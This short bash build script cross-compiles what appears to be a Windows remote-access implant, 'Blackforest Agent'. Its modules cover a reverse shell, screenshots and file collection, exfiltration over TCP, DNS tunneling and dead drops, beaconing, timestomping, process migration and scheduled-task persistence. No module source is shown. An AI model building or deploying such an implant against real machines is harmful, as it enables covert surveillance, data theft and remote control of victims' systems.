#!/bin/bash
# scripts/build.sh
# Compiles Blackforest Agent

# Ensure we are in the project root
cd "$(dirname "$0")/.." || exit

echo "[*] Compiling Blackforest Agent..."

# Ensure bin exists
mkdir -p bin

x86_64-w64-mingw32-g++ -o bin/Blackforest.exe \
    src/main.cpp \
    src/core/maintenance/updater.cpp \
    src/core/collection/screenshot.cpp \
    src/core/collection/file_walker.cpp \
    src/core/collection/reverse_shell.cpp \
    src/exfil/tcp_client.cpp \
    src/exfil/dns_tunnel.cpp \
    src/core/collection/system_info.cpp \
    src/core/evasion/timestomp.cpp \
    src/core/persistence/scheduled_task.cpp \
    src/exfil/dead_drop.cpp \
    src/core/evasion/process_migration.cpp \
    src/crypto/rsa.cpp \
    src/exfil/beacon.cpp \
    -Iinclude -static \
    -lws2_32 -lgdiplus -lgdi32 -lwininet -lole32 -luuid -lurlmon -liphlpapi -mwindows

if [ $? -eq 0 ]; then
    echo "[+] Build Success: bin/Blackforest.exe"
else
    echo "[-] Build Failed."
    exit 1
fi
